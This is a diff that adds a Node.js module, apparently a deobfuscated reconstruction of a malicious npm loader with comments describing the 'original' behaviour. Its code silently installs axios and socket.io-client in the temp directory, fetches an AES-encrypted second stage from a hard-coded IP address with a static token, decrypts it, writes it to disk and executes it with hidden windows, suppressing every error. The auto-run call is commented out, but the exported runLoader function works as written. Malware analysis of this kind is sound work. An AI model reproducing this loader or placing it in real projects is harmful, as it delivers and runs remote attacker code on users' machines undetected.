@@ -1,0 +1,131 @@
+'use strict';
+
+const { execSync } = require('child_process');
+const os = require('os');
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
+
+const CONFIG = {
+    server: 'http://194.156.90.241',
+    apiPath: '/api/service/',
+    token: 'aa70fc4445d73114c1b9ad081019ed20',
+
+    outputName: 'pack',
+    algorithm: 'aes-256-cbc',
+    keySalt: 'salt',
+
+    installCommand:
+        'npm install axios socket.io-client ' +
+        '--no-warnings --no-progress --loglevel silent',
+
+    executeCommand: 'node pack'
+};
+
+function decryptPayload(responseData, key) {
+    /*
+     * Expected server response:
+     *
+     *     BASE64_IV:BASE64_CIPHERTEXT
+     */
+    const [ivBase64, ciphertextBase64] = responseData.split(':', 2);
+
+    const decipher = crypto.createDecipheriv(
+        CONFIG.algorithm,
+        key,
+        Buffer.from(ivBase64, 'base64')
+    );
+
+    let plaintext = decipher.update(
+        ciphertextBase64,
+        'base64',
+        'utf8'
+    );
+
+    plaintext += decipher.final('utf8');
+
+    return plaintext;
+}
+
+function runLoader() {
+    try {
+        const tempDirectory = os.tmpdir();
+
+        /*
+         * Installs dependencies in the temporary directory.
+         * axios is used by this loader.
+         * socket.io-client is made available to the downloaded stage.
+         */
+        execSync(CONFIG.installCommand, {
+            windowsHide: true,
+            cwd: tempDirectory
+        });
+
+        const axios = require('axios');
+
+        /*
+         * Prevent visible failures from uncaught exceptions and rejected
+         * promises.
+         */
+        process.on('uncaughtException', () => {});
+        process.on('unhandledRejection', () => {});
+
+        /*
+         * The same static token is used in the request URL and as the
+         * password material for the AES key.
+         */
+        const key = crypto.scryptSync(
+            CONFIG.token,
+            CONFIG.keySalt,
+            32
+        );
+
+        const requestUrl =
+            CONFIG.server +
+            CONFIG.apiPath +
+            CONFIG.token;
+
+        axios.get(requestUrl)
+            .then((response) => {
+                try {
+                    const payloadPath = path.join(
+                        tempDirectory,
+                        CONFIG.outputName
+                    );
+
+                    const payloadSource = decryptPayload(
+                        response.data,
+                        key
+                    );
+
+                    fs.writeFileSync(payloadPath, payloadSource, {
+                        flag: 'w+'
+                    });
+
+                    execSync(CONFIG.executeCommand, {
+                        windowsHide: true,
+                        cwd: tempDirectory
+                    });
+                } catch (_) {
+                    // Original silently ignores these failures.
+                }
+            })
+            .catch(() => {});
+    } catch (_) {
+        // Original silently ignores setup failures.
+    }
+}
+
+/*
+ * Original behavior:
+ *
+ * runLoader();
+ */
+
+module.exports = {
+    CONFIG,
+    decryptPayload,
+    runLoader
+};
+
+
